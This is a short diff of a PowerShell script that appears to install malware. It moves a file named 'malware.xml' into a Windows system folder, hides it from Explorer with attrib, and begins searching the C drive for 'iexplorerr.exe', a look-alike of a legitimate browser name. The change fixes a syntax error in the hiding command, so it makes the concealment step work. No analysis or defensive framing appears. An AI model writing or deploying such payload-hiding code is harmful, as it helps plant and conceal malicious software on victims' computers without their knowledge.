@@ -7,7 +7,8 @@ $malvbsLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.F
 # Move malware.xml
 move $malvbsLoc C:\Program Files\Common Files\System
 # Hide the file from windows explorer using attrib 
-attrib +hC:\Program Files\Common Files\System\malware.xml
+attrib +h C:\Program Files\Common Files\System\malware.xml
+
 # Find iexplorerr.exe
 $file = 'iexplorerr.exe'
 $searchinfolder = 'C:\'
